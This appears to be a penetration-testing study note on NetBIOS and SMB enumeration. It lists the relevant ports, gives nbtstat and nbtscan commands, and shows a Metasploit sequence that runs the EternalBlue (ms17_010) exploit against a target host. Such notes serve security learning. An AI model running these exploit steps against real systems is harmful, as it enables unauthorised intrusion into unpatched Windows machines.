<h5><em>Update: Aug-2022</em></h5>

<h2> NetBIOS and SM Enumeration</h2>

<h3> NetBIOS</h3>

-   Used befor Windows 7
-   NetBIOS Name Service (NetBIOS-NS): UDP 137
-   16-character name assigned to a computer in a workgroup by WINS for name resolution of an IP address to NetBIOS name (Now uses DNS for name resolution)
-   NetBIOS Datagram Service (NetBIOS-DGM): UDP 138
-   NetBIOS Session service (NetBIOS-SSN): TCP 139
-   SMB protocol: TCP 445
-   Microsoft Remopte Procedure Call (RPC): TCP135

```sh
# PowerShell
nbtstat -a <host-address>
# Bash
nbtscan

```

<h3> Server Message Block (SMB)</h3>

-   [Exploit Database](https://www.exploit-db.com/)

```sh
# Bash
sudo searchexploit smb

# Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOST <host-address>
set LHOST <host-address>
exploit

```

-   [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue)
    -   SMB exploit tool leaked from U.S. NSA
